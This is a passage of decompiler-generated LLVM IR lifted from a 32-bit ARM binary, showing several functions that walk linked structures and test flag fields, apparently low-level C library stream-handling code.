  %v0_14d50 = load i32, i32* %r6.global-to-local, align 4
  %v2_14d50 = add i32 %v0_14d50, 24
  %v3_14d50 = inttoptr i32 %v2_14d50 to i32*
  %v4_14d50 = load i32, i32* %v3_14d50, align 4
  store i32 %v4_14d50, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_14d50)
  br label %dec_label_pc_14d5c

dec_label_pc_14d5c:                               ; preds = %.thread, %dec_label_pc_14cdc, %dec_label_pc_14d44
  %v0_14d5c = load i32, i32* %r4.global-to-local, align 4
  %v2_14d64 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14d64, i32* @r4, align 4
  store i32 %v6_14ca4, i32* @r5, align 4
  store i32 %v12_14ca4, i32* @lr, align 4
  ret i32 %v0_14d5c

; uselistorder directives
  uselistorder i32 %v3_14d20, { 1, 0, 2 }
  uselistorder i32 %v3_14cc4, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 0, 5, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_14d5c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14d44, { 1, 0 }
}

define i32 @function_14d70(i32 %arg1) local_unnamed_addr {
dec_label_pc_14d70:
  %v0_14d70 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14d70, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_14d70
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14d70, %bb
  %v10_14d7c = phi i32 [ %arg1, %dec_label_pc_14d70 ], [ 0, %bb ]
  ret i32 %v10_14d7c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_14d80(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_14d80:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_14d80 = load i32, i32* @r4, align 4
  store i32 %v3_14d80, i32* %stack_var_-28, align 4
  %v6_14d80 = load i32, i32* @r5, align 4
  %v9_14d80 = load i32, i32* @r6, align 4
  %v12_14d80 = load i32, i32* @r7, align 4
  %v21_14d80 = load i32, i32* @lr, align 4
  %v1_14d84 = add i32 %arg3, 52
  %v2_14d84 = inttoptr i32 %v1_14d84 to i32*
  %v3_14d84 = load i32, i32* %v2_14d84, align 4
  %v1_14d8c = sub i32 1, %v3_14d84
  %v2_14d8c = icmp ult i32 %v3_14d84, 2
  br i1 %v2_14d8c, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_14d80
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_14d80, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_14d8c, %dec_label_pc_14d80 ]
  %v0_14d94 = phi i32 [ 0, %bb ], [ %v1_14d8c, %dec_label_pc_14d80 ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_14d94 = icmp eq i32 %v0_14d94, 0
  store i32 124804, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_14d94, label %dec_label_pc_14de8, label %dec_label_pc_14db0

dec_label_pc_14db0:                               ; preds = %bb16
  %v1_14db4 = add i32 %arg3, 56
  store i32 %v1_14db4, i32* @r4, align 4
  %v4_14dc8 = load i32, i32* inttoptr (i32 124876 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_14dc8)
  %v0_14ddc = load i32, i32* @r5, align 4
  %v2_14ddc = add i32 %v0_14ddc, 16
  %v3_14ddc = inttoptr i32 %v2_14ddc to i32*
  %v4_14ddc = load i32, i32* %v3_14ddc, align 4
  store i32 %v4_14ddc, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_14de8.541 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14ddc)
  %v0_14de8.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_14dec.pre = load i32, i32* @r7, align 4
  %v0_14df0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14de8

dec_label_pc_14de8:                               ; preds = %bb16, %dec_label_pc_14db0
  %v0_14df0 = phi i32 [ %arg3, %bb16 ], [ %v0_14df0.pre, %dec_label_pc_14db0 ]
  %v0_14dec = phi i32 [ %arg2, %bb16 ], [ %v0_14dec.pre, %dec_label_pc_14db0 ]
  %v0_14de8 = phi i32 [ %arg1, %bb16 ], [ %v0_14de8.pre, %dec_label_pc_14db0 ]
  %v3_14df4 = inttoptr i32 %v0_14de8 to i8*
  %v4_14df4 = call i32 @function_152fc(i8* %v3_14df4, i32 %v0_14dec, i32 %v0_14df0)
  %v0_14df8 = load i32, i32* %sl.global-to-local, align 4
  %v2_14df8 = icmp eq i32 %v0_14df8, 0
  store i32 %v4_14df4, i32* %r4.global-to-local, align 4
  br i1 %v2_14df8, label %dec_label_pc_14de8..thread3_crit_edge, label %bb17

dec_label_pc_14de8..thread3_crit_edge:            ; preds = %dec_label_pc_14de8
  %v0_14e14.pre = load i32, i32* @ip, align 4
  br label %.thread3

bb17:                                             ; preds = %dec_label_pc_14de8
  %v1_14e0c = load i32, i32* @r5, align 4
  %v3_14e0c = add i32 %v1_14e0c, 24
  %v4_14e0c = inttoptr i32 %v3_14e0c to i32*
  %v5_14e0c = load i32, i32* %v4_14e0c, align 4
  store i32 %v5_14e0c, i32* @ip, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_14de8..thread3_crit_edge, %bb17
  %v0_14e14 = phi i32 [ %v0_14e14.pre, %dec_label_pc_14de8..thread3_crit_edge ], [ %v5_14e0c, %bb17 ]
  %v2_14e14 = xor i1 %v2_14df8, true
  call void @__pseudo_cond_branch(i1 %v2_14e14, i32 %v0_14e14)
  %v0_14e18 = load i32, i32* %r4.global-to-local, align 4
  %v2_14e20 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_14e20, i32* %r4.global-to-local, align 4
  store i32 %v6_14d80, i32* @r5, align 4
  store i32 %v9_14d80, i32* @r6, align 4
  store i32 %v12_14d80, i32* @r7, align 4
  store i32 %v21_14d80, i32* @lr, align 4
  ret i32 %v0_14e18

; uselistorder directives
  uselistorder i32 %v3_14d84, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0 }
  uselistorder i32 52, { 9, 10, 11, 12, 13, 3, 14, 7, 8, 4, 16, 17, 1, 18, 0, 19, 20, 5, 6, 15, 2 }
  uselistorder i32 %arg3, { 0, 3, 1, 2 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_14de8, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_14e2c(i32 %arg1) local_unnamed_addr {
dec_label_pc_14e2c:
  %v0_14e2c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14e2c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_14e2c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14e2c, %bb
  %v10_14e38 = phi i32 [ %arg1, %dec_label_pc_14e2c ], [ 0, %bb ]
  ret i32 %v10_14e38

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_14e3c() local_unnamed_addr {
dec_label_pc_14e3c:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14e3c = load i32, i32* @r4, align 4
  store i32 %v3_14e3c, i32* %stack_var_-24, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 124804, i32* %r6.global-to-local, align 4
  %v4_14e4c = load i32, i32* inttoptr (i32 124840 to i32*), align 8
  store i32 %v4_14e4c, i32* %r8.global-to-local, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_14e54 = load i32, i32* inttoptr (i32 124912 to i32*), align 16
  store i32 %v4_14e54, i32* %r4.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_14e60 = load i32, i32* inttoptr (i32 124876 to i32*), align 4
  store i32 %v4_14e60, i32* %r7.global-to-local, align 4
  %v2_14e6c = ptrtoint i32* %stack_var_-40 to i32
  call void @__pseudo_branch(i32 %v4_14e60)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_14e80 = load i32, i32* %r6.global-to-local, align 4
  %v2_14e80 = add i32 %v0_14e80, 16
  %v3_14e80 = inttoptr i32 %v2_14e80 to i32*
  %v4_14e80 = load i32, i32* %v3_14e80, align 4
  store i32 %v4_14e80, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14e80)
  store i32 12, i32* %r3.global-to-local, align 4
  %v0_14e90 = load i32, i32* %r6.global-to-local, align 4
  %v2_14e90 = add i32 %v0_14e90, 12
  %v3_14e90 = inttoptr i32 %v2_14e90 to i32*
  %v4_14e90 = load i32, i32* %v3_14e90, align 4
  store i32 %v4_14e90, i32* %r3.global-to-local, align 4
  %v1_14e94 = inttoptr i32 %v4_14e90 to i32*
  %v2_14e94 = load i32, i32* %v1_14e94, align 4
  store i32 %v2_14e94, i32* %r3.global-to-local, align 4
  %v7_14e98 = icmp eq i32 %v2_14e94, 1
  br i1 %v7_14e98, label %dec_label_pc_14ea0, label %dec_label_pc_14f60

dec_label_pc_14ea0:                               ; preds = %dec_label_pc_14e3c
  store i32 48, i32* %r3.global-to-local, align 4
  %v2_14ea4 = add i32 %v0_14e90, 48
  %v3_14ea4 = inttoptr i32 %v2_14ea4 to i32*
  %v4_14ea4 = load i32, i32* %v3_14ea4, align 4
  store i32 %v4_14ea4, i32* %r3.global-to-local, align 4
  %v1_14ea8 = inttoptr i32 %v4_14ea4 to i32*
  %v2_14ea8 = load i32, i32* %v1_14ea8, align 4
  store i32 %v2_14ea8, i32* %r3.global-to-local, align 4
  %tmp30 = icmp slt i32 %v2_14ea8, 1
  br i1 %tmp30, label %dec_label_pc_14f60, label %dec_label_pc_14eb4

dec_label_pc_14eb4:                               ; preds = %dec_label_pc_14ea0
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_14eb8 = add i32 %v0_14e90, 96
  %v3_14eb8 = inttoptr i32 %v2_14eb8 to i32*
  %v4_14eb8 = load i32, i32* %v3_14eb8, align 4
  store i32 %v4_14eb8, i32* %r4.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14e60)
  call void @__pseudo_branch(i32 %v4_14e80)
  %v0_14ee0 = load i32, i32* %r6.global-to-local, align 4
  %v2_14ee0 = add i32 %v0_14ee0, 44
  %v3_14ee0 = inttoptr i32 %v2_14ee0 to i32*
  %v4_14ee0 = load i32, i32* %v3_14ee0, align 4
  store i32 %v4_14ee0, i32* %r3.global-to-local, align 4
  %v1_14ee4 = inttoptr i32 %v4_14ee0 to i32*
  %v2_14ee4 = load i32, i32* %v1_14ee4, align 4
  store i32 %v2_14ee4, i32* %r4.global-to-local, align 4
  store i32 44, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_14f3011 = icmp eq i32 %v2_14ee4, 0
  br i1 %v2_14f3011, label %dec_label_pc_14f3c, label %dec_label_pc_14ef4

dec_label_pc_14ef4:                               ; preds = %dec_label_pc_14eb4, %dec_label_pc_14f2c
  %v0_14f182 = phi i32 [ %v0_14f2c, %dec_label_pc_14f2c ], [ %v2_14ee4, %dec_label_pc_14eb4 ]
  %v1_14ef4 = inttoptr i32 %v0_14f182 to i16*
  %v2_14ef4 = load i16, i16* %v1_14ef4, align 2
  %v3_14ef4 = zext i16 %v2_14ef4 to i32
  store i32 %v3_14ef4, i32* %r3.global-to-local, align 4
  %v2_14ef8 = and i32 %v3_14ef4, 32816
  %v7_14efc = icmp eq i32 %v2_14ef8, 48
  %v1_14f00 = add i32 %v0_14f182, 32
  %v2_14f00 = inttoptr i32 %v1_14f00 to i32*
  %v3_14f00 = load i32, i32* %v2_14f00, align 4
  store i32 %v3_14f00, i32* %r5.global-to-local, align 4
  br i1 %v7_14efc, label %dec_label_pc_14f0c, label %.thread21

.thread21:                                        ; preds = %dec_label_pc_14ef4
  store i32 %v0_14f182, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14f2c

dec_label_pc_14f0c:                               ; preds = %dec_label_pc_14ef4
  %v0_14f0c = load i32, i32* %r7.global-to-local, align 4
  %v2_14f0c = icmp eq i32 %v0_14f0c, 0
  br i1 %v2_14f0c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_14f0c
  %v1_14f10 = load i32, i32* %r6.global-to-local, align 4
  %v2_14f10 = load i32, i32* %r8.global-to-local, align 4
  %v3_14f10 = add i32 %v2_14f10, %v1_14f10
  %v4_14f10 = inttoptr i32 %v3_14f10 to i32*
  %v5_14f10 = load i32, i32* %v4_14f10, align 4
  store i32 %v5_14f10, i32* %r3.global-to-local, align 4
  %v3_14f14 = inttoptr i32 %v5_14f10 to i32*
  store i32 %v3_14f00, i32* %v3_14f14, align 4
  %v0_14f18 = load i32, i32* %r4.global-to-local, align 4
  %v1_14f18 = inttoptr i32 %v0_14f18 to i16*
  %v2_14f18 = load i16, i16* %v1_14f18, align 2
  %v3_14f18 = zext i16 %v2_14f18 to i32
  store i32 %v3_14f18, i32* %r3.global-to-local, align 4
  br label %bb31

bb:                                               ; preds = %dec_label_pc_14f0c
  %v2_14f188 = load i16, i16* %v1_14ef4, align 2
  %v3_14f189 = zext i16 %v2_14f188 to i32
  store i32 %v3_14f189, i32* %r3.global-to-local, align 4
  %v3_14f1c = add i32 %v0_14f0c, 32
  %v4_14f1c = inttoptr i32 %v3_14f1c to i32*
  store i32 %v3_14f00, i32* %v4_14f1c, align 4
  %v0_14f20.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb31

bb31:                                             ; preds = %.thread, %bb
  %v0_14f20 = phi i32 [ %v3_14f18, %.thread ], [ %v0_14f20.pre, %bb ]
  %v1_14f20 = and i32 %v0_14f20, 8192
  %v2_14f20 = icmp eq i32 %v1_14f20, 0
  br i1 %v2_14f20, label %bb33, label %bb32

bb32:                                             ; preds = %bb31
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_14f28 = xor i1 %v2_14f20, true
  call void @__pseudo_cond_branch(i1 %v1_14f28, i32 ptrtoint (i32* @global_var_12898.21 to i32))
  %v0_14f2c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14f2c

dec_label_pc_14f2c:                               ; preds = %.thread21, %bb33
  %v0_14f2c = phi i32 [ %v0_14f2c.pre, %bb33 ], [ %v3_14f00, %.thread21 ]
  store i32 %v0_14f2c, i32* %r4.global-to-local, align 4
  %v2_14f30 = icmp eq i32 %v0_14f2c, 0
  br i1 %v2_14f30, label %dec_label_pc_14f30.dec_label_pc_14f3c_crit_edge, label %dec_label_pc_14ef4

dec_label_pc_14f30.dec_label_pc_14f3c_crit_edge:  ; preds = %dec_label_pc_14f2c
  %v0_14f48.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14f3c

dec_label_pc_14f3c:                               ; preds = %dec_label_pc_14f30.dec_label_pc_14f3c_crit_edge, %dec_label_pc_14eb4
  %v0_14f48 = phi i32 [ %v0_14f48.pre, %dec_label_pc_14f30.dec_label_pc_14f3c_crit_edge ], [ %v0_14ee0, %dec_label_pc_14eb4 ]
  store i32 24, i32* %r3.global-to-local, align 4
  %v2_14f48 = add i32 %v0_14f48, 24
  %v3_14f48 = inttoptr i32 %v2_14f48 to i32*
  %v4_14f48 = load i32, i32* %v3_14f48, align 4
  call void @__pseudo_branch(i32 %v4_14f48)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_14f58 = load i32, i32* %r6.global-to-local, align 4
  %v2_14f58 = add i32 %v0_14f58, 48
  %v3_14f58 = inttoptr i32 %v2_14f58 to i32*
  %v4_14f58 = load i32, i32* %v3_14f58, align 4
  store i32 %v4_14f58, i32* %r3.global-to-local, align 4
  %v0_14f5c = load i32, i32* %r4.global-to-local, align 4
  %v2_14f5c = inttoptr i32 %v4_14f58 to i32*
  store i32 %v0_14f5c, i32* %v2_14f5c, align 4
  %v0_14f64.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14f60

dec_label_pc_14f60:                               ; preds = %dec_label_pc_14e3c, %dec_label_pc_14ea0, %dec_label_pc_14f3c
  %v0_14f64 = phi i32 [ %v0_14e90, %dec_label_pc_14e3c ], [ %v0_14e90, %dec_label_pc_14ea0 ], [ %v0_14f64.pre, %dec_label_pc_14f3c ]
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_14f64 = add i32 %v0_14f64, 12
  %v3_14f64 = inttoptr i32 %v2_14f64 to i32*
  %v4_14f64 = load i32, i32* %v3_14f64, align 4
  %v1_14f68 = inttoptr i32 %v4_14f64 to i32*
  %v2_14f68 = load i32, i32* %v1_14f68, align 4
  %v1_14f6c = add i32 %v2_14f68, -1
  store i32 %v1_14f6c, i32* %v1_14f68, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_14f80 = load i32, i32* %r6.global-to-local, align 4
  %v2_14f80 = add i32 %v0_14f80, 24
  %v3_14f80 = inttoptr i32 %v2_14f80 to i32*
  %v4_14f80 = load i32, i32* %v3_14f80, align 4
  call void @__pseudo_branch(i32 %v4_14f80)
  %v2_14f90 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14f90, i32* %r4.global-to-local, align 4
  ret i32 %v2_14e6c

; uselistorder directives
  uselistorder i32 %v0_14f2c, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 6, 1, 7, 2, 3, 4, 5, 8 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 20, 21, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* inttoptr (i32 124840 to i32*), { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_14f60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14f2c, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_14ef4, { 1, 0 }
}

define i32 @function_14f9c(i16* %arg1) local_unnamed_addr {
dec_label_pc_14f9c:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v0_14f9c = load i1, i1* @cpsr_z, align 1
  %v2_14f9c = load i32, i32* @r4, align 4
  br i1 %v0_14f9c, label %bb, label %dec_label_pc_14f9c..thread8_crit_edge

dec_label_pc_14f9c..thread8_crit_edge:            ; preds = %dec_label_pc_14f9c
  %v0_14fd8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread8

bb:                                               ; preds = %dec_label_pc_14f9c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_14f9c..thread8_crit_edge, %bb
  %v0_15178 = phi i32 [ %v0_14fd8.pre, %dec_label_pc_14f9c..thread8_crit_edge ], [ 0, %bb ]
  store i32 %v2_14f9c, i32* %stack_var_-36, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 124804, i32* %sb.global-to-local, align 4
  %v4_14fd4 = load i32, i32* inttoptr (i32 124848 to i32*), align 16
  store i32 %v4_14fd4, i32* %r3.global-to-local, align 4
  %v9_14fd8 = icmp eq i32 %v0_15178, %v4_14fd4
  store i32 %v0_15178, i32* %fp.global-to-local, align 4
  br i1 %v9_14fd8, label %bb49, label %dec_label_pc_14ff0

bb49:                                             ; preds = %.thread8
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_15000

dec_label_pc_14ff0:                               ; preds = %.thread8
  store i32 256, i32* %r2.global-to-local, align 4
  %v2_14ff4 = icmp eq i32 %v0_15178, 0
  br i1 %v2_14ff4, label %dec_label_pc_15000, label %dec_label_pc_15168

dec_label_pc_15000:                               ; preds = %bb49, %dec_label_pc_14ff0
  %stack_var_-60.1.in = phi i32 [ 0, %bb49 ], [ 256, %dec_label_pc_14ff0 ]
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_15014 = load i32, i32* inttoptr (i32 124912 to i32*), align 16
  store i32 %v4_15014, i32* %r4.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_1501c = ptrtoint i32* %stack_var_-56 to i32
  %v4_15020 = load i32, i32* inttoptr (i32 124876 to i32*), align 4
  store i32 16, i32* %stack_var_-72, align 4
  store i32 %v2_1501c, i32* %r0.global-to-local, align 4
  store i32 %v4_15014, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15020)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_15040 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15040, i32* %r0.global-to-local, align 4
  %v0_15044 = load i32, i32* %sb.global-to-local, align 4
  %v2_15044 = add i32 %v0_15044, 16
  %v3_15044 = inttoptr i32 %v2_15044 to i32*
  %v4_15044 = load i32, i32* %v3_15044, align 4
  call void @__pseudo_branch(i32 %v4_15044)
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_15054 = add i32 %v0_15044, 12
  %v3_15054 = inttoptr i32 %v2_15054 to i32*
  %v4_15054 = load i32, i32* %v3_15054, align 4
  store i32 %v4_15054, i32* %r2.global-to-local, align 4
  %v1_15058 = inttoptr i32 %v4_15054 to i32*
  %v2_15058 = load i32, i32* %v1_15058, align 4
  store i32 24, i32* %sl.global-to-local, align 4
  %v1_15060 = add i32 %v2_15058, 1
  store i32 %v1_15060, i32* %r3.global-to-local, align 4
  %v2_15064 = add i32 %v0_15044, 24
  %v3_15064 = inttoptr i32 %v2_15064 to i32*
  %v4_15064 = load i32, i32* %v3_15064, align 4
  store i32 %v1_15060, i32* %v1_15058, align 4
  store i32 %v2_1501c, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15064)
  store i32 96, i32* %r3.global-to-local, align 4
  %v0_15080 = load i32, i32* %sb.global-to-local, align 4
  %v2_15080 = add i32 %v0_15080, 96
  %v3_15080 = inttoptr i32 %v2_15080 to i32*
  %v4_15080 = load i32, i32* %v3_15080, align 4
  store i32 %v4_15080, i32* @r4, align 4
  store i32 %v4_15080, i32* %r2.global-to-local, align 4
  store i32 %v2_1501c, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15020)
  %v0_15098 = load i32, i32* @r4, align 4
  store i32 %v0_15098, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15044)
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_150a8 = load i32, i32* %sb.global-to-local, align 4
  %v2_150a8 = add i32 %v0_150a8, 44
  %v3_150a8 = inttoptr i32 %v2_150a8 to i32*
  %v4_150a8 = load i32, i32* %v3_150a8, align 4
  store i32 %v4_150a8, i32* %r3.global-to-local, align 4
  store i32 %v2_1501c, i32* %r0.global-to-local, align 4
  %v1_150b4 = inttoptr i32 %v4_150a8 to i32*
  %v2_150b4 = load i32, i32* %v1_150b4, align 4
  store i32 %v2_150b4, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v4_15064)
  %v0_150c0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_150c0, i32* @r6, align 4
  %v2_150c4 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_150c4, i32* @r8, align 4
  store i32 72, i32* %fp.global-to-local, align 4
  %v0_15158.pr = load i32, i32* @r7, align 4
  %v2_1515828 = icmp eq i32 %v0_15158.pr, 0
  br i1 %v2_1515828, label %dec_label_pc_15160, label %dec_label_pc_150cc

dec_label_pc_150cc:                               ; preds = %dec_label_pc_15000, %dec_label_pc_15154
  %v0_150d8 = phi i32 [ %v3_15154, %dec_label_pc_15154 ], [ %v0_15158.pr, %dec_label_pc_15000 ]
  %v1_150cc = inttoptr i32 %v0_150d8 to i16*
  %v2_150cc = load i16, i16* %v1_150cc, align 2
  %v3_150cc = zext i16 %v2_150cc to i32
  store i32 %v3_150cc, i32* %r3.global-to-local, align 4
  %v1_150d0 = and i32 %v3_150cc, 64
  %v2_150d0 = icmp eq i32 %v1_150d0, 0
  br i1 %v2_150d0, label %dec_label_pc_15154, label %dec_label_pc_150d8

dec_label_pc_150d8:                               ; preds = %dec_label_pc_150cc
  %v1_150d8 = add i32 %v0_150d8, 56
  store i32 %v1_150d8, i32* @r4, align 4
  store i32 %v1_150d8, i32* %r2.global-to-local, align 4
  store i32 %v2_1501c, i32* %r0.global-to-local, align 4
  %v0_150e8 = load i32, i32* %sb.global-to-local, align 4
  %v1_150e8 = load i32, i32* %fp.global-to-local, align 4
  %v2_150e8 = add i32 %v1_150e8, %v0_150e8
  %v3_150e8 = inttoptr i32 %v2_150e8 to i32*
  %v4_150e8 = load i32, i32* %v3_150e8, align 4
  call void @__pseudo_branch(i32 %v4_150e8)
  %v0_150f4 = load i32, i32* @r4, align 4
  store i32 %v0_150f4, i32* %r0.global-to-local, align 4
  %v0_150f8 = load i32, i32* %sb.global-to-local, align 4
  %v1_150f8 = load i32, i32* @r8, align 4
  %v2_150f8 = add i32 %v1_150f8, %v0_150f8
  %v3_150f8 = inttoptr i32 %v2_150f8 to i32*
  %v4_150f8 = load i32, i32* %v3_150f8, align 4
  call void @__pseudo_branch(i32 %v4_150f8)
  %v0_15104 = load i32, i32* @r7, align 4
  %v1_15104 = inttoptr i32 %v0_15104 to i16*
  %v2_15104 = load i16, i16* %v1_15104, align 2
  %v3_15104 = zext i16 %v2_15104 to i32
  store i32 %stack_var_-60.1.in, i32* %r2.global-to-local, align 4
  %v2_1510c = or i32 %v3_15104, %stack_var_-60.1.in
  %v1_15110 = xor i32 %v2_1510c, 320
  store i32 %v1_15110, i32* %r3.global-to-local, align 4
  %v1_15114 = and i32 %v1_15110, 832
  %v2_15114 = icmp eq i32 %v1_15114, 0
  br i1 %v2_15114, label %dec_label_pc_1511c, label %bb50

dec_label_pc_1511c:                               ; preds = %dec_label_pc_150d8
  store i32 %v0_15104, i32* %r0.global-to-local, align 4
  %v1_15120 = call i32 @function_14c74(i32 %v0_15104)
  store i32 %v1_15120, i32* %r0.global-to-local, align 4
  %v2_15124 = icmp eq i32 %v1_15120, 0
  br i1 %v2_15124, label %.thread16, label %.thread17

.thread16:                                        ; preds = %dec_label_pc_1511c
  %v1_15128 = load i32, i32* @r7, align 4
  %v2_15128 = inttoptr i32 %v1_15128 to i16*
  %v3_15128 = load i16, i16* %v2_15128, align 2
  %v4_15128 = zext i16 %v3_15128 to i32
  store i32 %v4_15128, i32* %r3.global-to-local, align 4
  %v2_1512c = add i32 %v1_15128, 8
  %v3_1512c = inttoptr i32 %v2_1512c to i32*
  %v4_1512c = load i32, i32* %v3_1512c, align 4
  store i32 %v4_1512c, i32* %r2.global-to-local, align 4
  %v2_15130 = and i32 %v4_15128, 65471
  store i32 %v2_15130, i32* %r3.global-to-local, align 4
  %v3_15134 = add i32 %v1_15128, 28
  %v4_15134 = inttoptr i32 %v3_15134 to i32*
  store i32 %v4_1512c, i32* %v4_15134, align 4
  %v1_15138 = load i32, i32* %r3.global-to-local, align 4
  %v2_15138 = trunc i32 %v1_15138 to i16
  %v3_15138 = load i32, i32* @r7, align 4
  %v4_15138 = inttoptr i32 %v3_15138 to i16*
  store i16 %v2_15138, i16* %v4_15138, align 2
  br label %bb50

.thread17:                                        ; preds = %dec_label_pc_1511c
  store i32 -1, i32* @r6, align 4
  br label %bb50

bb50:                                             ; preds = %.thread16, %dec_label_pc_150d8, %.thread17
  store i32 %v2_1501c, i32* %r0.global-to-local, align 4
  %v0_15148 = load i32, i32* %sb.global-to-local, align 4
  %v1_15148 = load i32, i32* %sl.global-to-local, align 4
  %v2_15148 = add i32 %v1_15148, %v0_15148
  %v3_15148 = inttoptr i32 %v2_15148 to i32*
  %v4_15148 = load i32, i32* %v3_15148, align 4
  call void @__pseudo_branch(i32 %v4_15148)
  %v0_15154.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15154

dec_label_pc_15154:                               ; preds = %dec_label_pc_150cc, %bb50
  %v0_15154 = phi i32 [ %v0_150d8, %dec_label_pc_150cc ], [ %v0_15154.pre, %bb50 ]
  %v1_15154 = add i32 %v0_15154, 32
  %v2_15154 = inttoptr i32 %v1_15154 to i32*
  %v3_15154 = load i32, i32* %v2_15154, align 4
  store i32 %v3_15154, i32* @r7, align 4
  %v2_15158 = icmp eq i32 %v3_15154, 0
  br i1 %v2_15158, label %dec_label_pc_15160, label %dec_label_pc_150cc

dec_label_pc_15160:                               ; preds = %dec_label_pc_15154, %dec_label_pc_15000
  %v0_15160 = call i32 @function_14e3c()
  store i32 %v0_15160, i32* %r0.global-to-local, align 4
  %v0_1519c.pre = load i32, i32* @r6, align 4
  br label %bb52

dec_label_pc_15168:                               ; preds = %dec_label_pc_14ff0
  %v1_15168 = inttoptr i32 %v0_15178 to i16*
  %v2_15168 = load i16, i16* %v1_15168, align 2
